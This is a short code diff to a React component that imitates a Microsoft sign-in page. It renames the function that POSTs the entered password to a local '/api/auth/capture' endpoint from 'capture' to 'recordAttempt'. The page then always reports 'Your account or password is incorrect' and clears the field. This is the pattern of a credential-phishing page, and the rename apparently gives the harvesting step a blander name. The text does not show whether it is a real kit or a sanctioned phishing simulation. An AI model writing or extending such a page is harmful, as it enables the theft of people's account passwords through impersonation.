@@ -11,7 +11,7 @@ export default function MicrosoftLoginPage() {
   const [busy, setBusy] = useState(false);
   const [err, setErr] = useState("");
 
-  async function capture() {
+  async function recordAttempt() {
     try {
       await fetch("/api/auth/capture", {
         method: "POST",
@@ -34,7 +34,7 @@ export default function MicrosoftLoginPage() {
     e.preventDefault();
     if (!password) return;
     setBusy(true);
-    await capture();
+    await recordAttempt();
     setBusy(false);
     setErr("Your account or password is incorrect.");
     setPassword("");
